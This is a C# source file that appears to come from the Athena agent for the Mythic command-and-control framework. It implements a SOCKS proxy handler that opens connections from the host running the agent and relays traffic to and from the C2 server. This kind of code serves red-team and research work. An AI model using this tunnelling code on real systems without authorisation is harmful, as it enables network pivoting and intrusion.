using Athena.Models.Athena.Commands;
using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using GodSharp.Sockets;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{
    //Try using this library for next rewrite
    //https://github.com/godsharp/GodSharp.Socket/blob/master/samples/GodSharp.Socket.TcpClientSample/Program.cs
    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, AthenaSocksConnection> connections { get; set; }
        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
        private object _lock = new object();
        public bool running { get; set; }

        public SocksHandler()
        {
            this.running = false;
            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
        }

        /// <summary>
        /// Start the SOCKS Listener
        /// </summary>
        public async Task<bool> Start()
        {
            this.ct = new CancellationTokenSource();
            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
            this.messagesOut = new ConcurrentBag<SocksMessage>();

            return true;
        }

        /// <summary>
        /// Stops the SOCKS Listener
        /// </summary>
        public async Task<bool> Stop()
        {
            if (!this.running)
            {
                return true;
            }

            this.running = false;

            if (this.ct is not null)
            {
                this.ct.Cancel();
            }

            return true;
        }

        /// <summary>
        /// Add a connection to the tracker dictionary
        /// </summary>
        /// <param name="conn">Socks Connection</param>
        public async Task<bool> AddConnection(AthenaSocksConnection conn)
        {
            return this.connections.TryAdd(conn.server_id, conn);
        }

        /// <summary>
        /// Remove connection from the tracker dictionary
        /// </summary>
        /// <param name="conn">Connection ID</param>
        public async Task<bool> RemoveConnection(int conn)
        {
            return this.connections.TryRemove(conn, out _);
        }

        /// <summary>
        /// Get messages from the out dictionary to forward to the Mythic server
        /// </summary>
        public async Task<List<SocksMessage>> GetMessages()
        {
            if (this.messagesOut.Count < 1)
            {
                return new List<SocksMessage>();
            }
            List<SocksMessage> msgOut;
            msgOut = new List<SocksMessage>(this.messagesOut);
            this.messagesOut.Clear();
            //msgOut.Reverse();
            Debug.WriteLine($"[{DateTime.Now}] Returning: {msgOut.Count} messages");
            return msgOut;
        }

        /// <summary>
        /// Handle a new message forwarded from the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task HandleMessage(SocksMessage sm)
        {
            AthenaSocksConnection conn;
            if (!this.connections.TryGetValue(sm.server_id, out conn)){
                await HandleNewConnection(sm);
                return;
            }

            if (!conn.IsConnectedOrConnecting())
            {
                await RemoveConnection(conn.server_id);

                ReturnMessage(new SocksMessage()
                {
                    server_id = conn.server_id,
                    data = "",
                    exit = true
                });
                return;
            }

            conn.client.Connection.Send(Misc.Base64DecodeToByteArray(sm.data));
        }

        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        private async Task HandleNewConnection(SocksMessage sm)
        {
            try
            {
                if (String.IsNullOrEmpty(sm.data))
                {
                    return;
                }

                ConnectionOptions co = new ConnectionOptions(sm); //Create new ConnectionOptions

                if(co.ip is null || co.port == 0) //Couldn't resolve IP address
                {
                    ReturnMessageFailure(co.server_id);
                    return;
                }

                AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object, and try to connect.
                sc.HandleSocksEvent += ReturnSocksMessage;

                await AddConnection(sc); //Add our connection to the Dictionary;
                sc.client.Start();
            }
            catch (Exception e)
            {
                ReturnMessageFailure(sm.server_id);
            }
        }

        /// <summary>
        /// Add a message to the out queue to be returned to the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public void ReturnMessage(SocksMessage sm)
        {
            this.messagesOut.Add(sm);
        }

        public async void ReturnMessageFailure(int id)
        {
            ReturnMessage(new SocksMessage
            {
                server_id = id,
                exit = true,
                data = await Misc.Base64Encode(new ConnectResponse
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                    status = ConnectResponseStatus.GeneralFailure,
                }.ToByte())
            });

        }

        private async void ReturnSocksMessage(object sender, SocksEventArgs e)
        {
            this.messagesOut.Add(e.sm);
        }
    }
}